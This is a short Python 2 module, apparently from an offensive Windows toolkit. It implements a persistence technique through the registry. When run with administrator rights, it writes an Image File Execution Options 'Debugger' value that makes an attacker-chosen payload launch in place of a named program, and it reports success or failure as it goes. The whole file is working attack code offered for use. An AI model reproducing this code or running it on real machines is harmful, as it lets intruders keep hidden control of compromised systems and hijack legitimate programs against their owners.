import os
import ctypes
import _winreg
from core.prints import *

def ifeo(process,payload):
	print """
 -------------------------------------------------------------
 Persistence technique using Image File Execution Option
 Debugger key, the payload provided will run instead of the
 actual executable upon execution.
 
 When everything worked correctly, we should gain persistence
 with current user privledges.
 -------------------------------------------------------------
 """
	print_info("Process: {}".format(process))
	print_info("Payload: {}".format(payload))
	
	"""
	If we are running elevated, we add the registry
	key Debugger and the path to our payload
	"""
	if (ctypes.windll.shell32.IsUserAnAdmin() == True):
		print_info("Attempting to create Debugger registry key")
		try:
			key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",process))
			_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,payload)
			_winreg.CloseKey(key)
			print_success("Successfully created Debugger registry key containing our payload")
		except Exception as error:
			print_error("Unable to create Debugger registry key, exception was raised")
			return False
	else:
		print_error("Unable to create Debugger registry key, we are not elevated")
		return False
